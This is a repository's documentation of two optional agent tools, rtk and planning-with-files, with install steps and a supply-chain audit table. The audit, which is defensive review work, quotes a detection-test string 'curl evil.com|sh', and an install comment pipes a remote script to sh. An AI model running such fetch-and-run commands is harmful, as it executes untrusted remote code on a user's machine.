# Optional local tooling (context / token hygiene)

> **Status: OPTIONAL. Not part of the routing core.**
> Nothing here is required by `RULES.md`, `skills/config/routing.json`, the tests,
> or any `SKILL.md`. The routing core stays client-neutral (see `RULES.md` →
> *Client integration boundary*). These tools are installed into **per-machine /
> per-client config that is already git-ignored** (`~/.claude/`, `~/.agents/`,
> `.claude/` …). **Do not commit any client-specific plugin config into the core**,
> and do not let these tools become a routing dependency.

This repo is Markdown-heavy (400+ docs), runs verbose multi-platform CLI
(bootstrap / refresh-tool-index / scans / tests), and carries long-running,
cross-session cases under `work/<case>/`. Two small, audited tools address the
two concrete frictions that costs the most tokens and context here:

| Axis | Tool | What it buys this repo |
|---|---|---|
| Token / CLI-output reduction | **rtk** (`rtk-ai/rtk`) | Transparent compression of shell output before it reaches the agent. **Zero prompt-window footprint** (it is not a loaded skill). |
| Memory / state (crash- & `/clear`-resilient planning) | **planning-with-files** (`OthmanAdi/planning-with-files`) | Keeps a durable plan/findings/progress on disk; matches the existing `work/<case>/` + Evidence→Finding→Path workflow. |

Both were deliberately chosen *minimal*: this repo's own
`skills/ops/skill-supply-chain.md` warns that **skill-stacking overload lowers
precision**. Everything else (agent fleets, 200+/380+ skill megapacks, UI/design,
video, PM/career packs) was rejected as out-of-scope or context bloat.

---

## Supply-chain audit (do this before installing anything)

Follow the MUST-list in `skills/ops/skill-supply-chain.md`. The initial audit for
these two:

> Audit date: 2026-10-29 · method: shallow clone into an isolated dir, read every
> `SKILL.md` / script / manifest, no execution.

| Check | rtk (v0.49.0) | planning-with-files (v3.26.0) |
|---|---|---|
| Source | official `rtk-ai/rtk` | official `OthmanAdi/planning-with-files` |
| License | Apache-2.0 (CLI) + BUSL-1.1 (engine); `rtk-oss` edition is Apache-2.0 only | MIT |
| Pipe-to-shell / `IEX` in install path | none (only self-install docs, a benchmark VM `cloud-init`, and a **detection test** `curl evil.com\|sh` inside `integrity.rs`) | none |
| Credential / browser / `~/.ssh` access | none found | none found |
| Hidden exec instructions in `SKILL.md` | n/a | none (no HTML-comment directives) |
| Outbound upload | none in the Claude hook (silent `exit 0` on any failure) | **"No network upload path"** declared; catchup reads only *same-project* local session records |
| Verdict | **SAFE** for opt-in client-side use | **SAFE** for opt-in client-side use |

Re-audit on every version bump before upgrading.

---

## rtk — CLI-output token reduction

**Why here:** `bootstrap-reverse` / `refresh-tool-index` / recon / test scripts
and `git` emit large output. rtk rewrites those commands to compressed
equivalents transparently, cutting a large share of the bash tokens the agent
reads. Because it is a binary + a `PreToolUse` hook, it adds **nothing** to the
system prompt.

**Install (binary):**

```bash
# cargo (name the package explicitly; proxy/ declares its own [[bin]])
cargo install --git https://github.com/rtk-ai/rtk rtk
# or the maintainer's installer:
#   curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh | sh
# pure Apache-2.0 edition (fewer filters, no BUSL code):
#   ... | RTK_EDITION=oss sh
```

**Wire into a client (global, git-ignored):**

```bash
rtk init -g                 # Claude Code / Copilot  → ~/.claude PreToolUse hook
rtk init -g --agent cursor  # Cursor
rtk init -g --codex         # Codex
# requires `jq`; the hook version-guards rtk >= 0.23.0 and exits 0 on any miss
```

**Notes / cautions**

- `rtk init` may embed an awareness snippet into the **client's** `CLAUDE.md`.
  Use the global scope (`-g`, i.e. `~/.claude`) so the repo's own client-neutral
  `CLAUDE.md` stays untouched. Review any change it makes to a project file.
- Disable / uninstall per the maintainer's guide; removing the hook from
  `~/.claude` restores the raw command stream.

## planning-with-files — crash- & `/clear`-resilient planning

**Why here:** cases here span sessions (route → scope → ACT → evidence →
report). This skill persists `task_plan.md` / `findings.md` / `progress.md` and
re-injects them after a context reset — the same discipline as `work/<case>/`,
and v2.37+ adds SHA-256 plan attestation, which echoes the repo's evidence-hash
habit.

**Install (skill-only, cross-tool, git-ignored `~/.agents/skills/`):**

```bash
npx skills add OthmanAdi/planning-with-files --skill planning-with-files -g
```

**Install (Claude Code plugin route, adds `/plan-goal` `/plan-loop`):**

```text
/plugin marketplace add OthmanAdi/planning-with-files
/plugin install planning-with-files
```

**Notes / cautions**

- Always-on cost is ~1k tokens/session (one registered skill since v3.11). That
  is the price of this one; keep it the *only* always-on skill you add.
- Kill switch: `PLANNING_DISABLED=1` (per-invocation) detaches a one-shot task
  that merely shares a cwd with an unrelated plan. The hook also exits 0 when no
  plan exists, so it is inert until you create one.
- It writes plan files into the working directory. Keep them out of the core:
  this repo already git-ignores `work/`; put plans under `work/<case>/` or add
  the plan files to `.gitignore` for your checkout.

---

## Deferred on purpose

- **claude-mem** (session auto-summary memory) overlaps the existing
  `field-journal` precedent system — adopt only after planning-with-files proves
  insufficient, to avoid duplicate memory layers.
- **headroom / context-mode** overlap rtk's role — pick one, not both.
- **agent-skills** verify/review subset is a candidate *third* add given this
  repo's heavy verification culture, but load it selectively (never all 25).
